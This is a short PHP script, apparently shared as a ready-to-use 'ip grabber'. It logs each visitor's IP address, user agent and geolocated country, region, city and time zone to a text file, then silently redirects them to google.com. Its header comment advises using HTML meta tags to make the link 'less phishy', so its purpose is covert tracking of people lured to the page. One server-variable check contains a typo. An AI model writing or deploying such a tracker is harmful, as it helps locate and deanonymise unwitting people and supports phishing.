<?php

	/*simple ip grabber that takes
	someone's ip address(with some extra details),
	writes them to file and redirects them to url.
	PRO-TIP:You can use html meta tags to make it
	less phishy.
	 */

	if(!empty($_SERVER['HTTP_CLIENT_IP'])){
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	}else if(!empty($_SERVER['HTTP_X_FORWARDER_FOR'])){
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}else{
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	//grabbing ip from server array

	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	//grabbing user agent from server array

	$api_data = file_get_contents("https://freegeoip.app/json/".$ip);
	$arr = json_decode($api_data,true);
	$country = $arr['country_name'];
	$region = $arr['region_name'];
	$city = $arr['city'];
	$time = $arr['time_zone'];
	//geting data from freegeoip api

	$filename = date('h:i:sa').".txt";
	$file = fopen($filename,"w") or die("could not open file");
	fwrite($file,"ip:".$ip."\n"."user_agent:".$user_agent."\n"."country:".$country."\n"."region:".$region."\n"."city:".$city."\n"."time:".$time."\n");
	fclose($file);
	//writing stuff to text file and closing it
	header("Location:https://google.com");
	//redirecting to google.com,but you can
	//change it to whatever you want

?>


